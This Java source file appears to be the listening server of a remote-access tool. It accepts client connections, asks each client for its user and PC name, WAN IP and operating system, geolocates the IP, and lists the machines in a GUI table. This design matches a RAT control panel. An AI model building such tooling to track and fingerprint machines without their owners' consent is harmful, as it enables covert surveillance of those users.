package rhp;

import java.net.*;
import java.util.ArrayList;
import java.util.Arrays;

import javax.swing.ImageIcon;
import javax.swing.JOptionPane;

import com.maxmind.geoip2.DatabaseReader;
import com.maxmind.geoip2.exception.GeoIp2Exception;
import com.maxmind.geoip2.model.CityResponse;
import com.maxmind.geoip2.record.City;
import com.maxmind.geoip2.record.Country;
import com.maxmind.geoip2.record.Location;
import com.maxmind.geoip2.record.Postal;
import com.maxmind.geoip2.record.Subdivision;

import java.io.*;
	
public class Server {
	static ArrayList<Socket> Clients = new ArrayList<Socket>();
	static ArrayList<String> OperatingSystem = new ArrayList<String>();
	static ArrayList<String> WANIP = new ArrayList<String>();
	static ArrayList<String> UserPC = new ArrayList<String>();
	public static int server_port;
	public static String server_host;
	public static ServerSocket mainsocket;
	public static Socket clientsocket;
	static byte[] buffer = new byte[4096];
	
	
	public static String ReturnLocation(int mode)
	{
		String dbLocation = "GeoLite2-City.mmdb";
		File database = new File(dbLocation);
		String ip = WANIP.get(Clients.indexOf(clientsocket));
	    DatabaseReader dbReader;
	    String countryName = null;
		try {
			dbReader = new DatabaseReader.Builder(database)
			  .build();
			if(ip.startsWith("No")) {
				countryName = "Failed to Get";
			} else {
				InetAddress ipAddress = InetAddress.getByName(ip);
			    CityResponse response;
				try {
					response = dbReader.city(ipAddress);
					countryName = response.getCountry().getName();
					String isocode = response.getCountry().getIsoCode();
					Subdivision subdivision = response.getMostSpecificSubdivision();
					String subd = subdivision.getName();
					if(mode==0)
					{
						return countryName;
					} else {
						return countryName + " Subdivision : " + subd;
					}
					
				} catch (GeoIp2Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		    
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return countryName;
	}
	
	static void SendData(Socket sock, String data)
	{
		try {
			OutputStream outputStream = sock.getOutputStream();
			DataOutputStream dataOutputStream = new DataOutputStream(outputStream);
			dataOutputStream.write(data.getBytes());
			dataOutputStream.flush();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NullPointerException ne) {
			ne.printStackTrace();
		}
	}
	
	public void getInformation()
	{
		int read;
		try {
			InputStream is = clientsocket.getInputStream();
		    PrintWriter pw = new PrintWriter(clientsocket.getOutputStream()); 
			
		    // Get USER PCs
		    SendData(clientsocket, "RHP_1");
		    Arrays.fill(buffer, (byte)0);
		    read = is.read(buffer);
		    String user_pc = new String(buffer, 0, read);
		    
		    // Get WAN IP
		    SendData(clientsocket, "RHP_2");
		    Arrays.fill(buffer, (byte)0);
		    read = is.read(buffer);
		    String wanip = new String(buffer, 0, read);
	
		    SendData(clientsocket, "RHP_3");
		    Arrays.fill(buffer, (byte)0);
		    read = is.read(buffer);
		    String operating_system = new String(buffer, 0, read);
		    
		    WANIP.add(wanip);
			OperatingSystem.add(operating_system);
			UserPC.add(user_pc);
			int id = Clients.indexOf(clientsocket);
			
			try {
				MainWindow.model.addRow(new Object[] {
						String.valueOf(id), clientsocket.getRemoteSocketAddress().toString().replace("/", "").split(":")[0], clientsocket.getRemoteSocketAddress().toString().replace("/", "").split(":")[1],  user_pc.split("/")[0], user_pc.split("/")[1],
						operating_system,
						wanip,
						ReturnLocation(0)
						}
				);
				
				MainWindow.Log("Connection Established from " + clientsocket.getRemoteSocketAddress().toString());
			} catch (Exception e)
			{
				e.printStackTrace();
			}
			
	        
	        new ServerThread(clientsocket).start();
	        
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}
	
	

	Thread tcpserver = new Thread(new Runnable() {
		
		@Override
		public void run() {
			try {
				mainsocket = new ServerSocket(server_port);
			} catch (java.net.BindException s) {
				JOptionPane.showMessageDialog(null, "Bind Error : " + s.toString());
				System.exit(0);
			}
			catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			while(true) {
				try {
					clientsocket = mainsocket.accept();
					System.out.println("[INFO] New connection from : " + clientsocket.getRemoteSocketAddress().toString());
					Clients.add(clientsocket);
					MainWindow.UpdateOnlineLabel();
					getInformation();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				
			}
		}
	});

}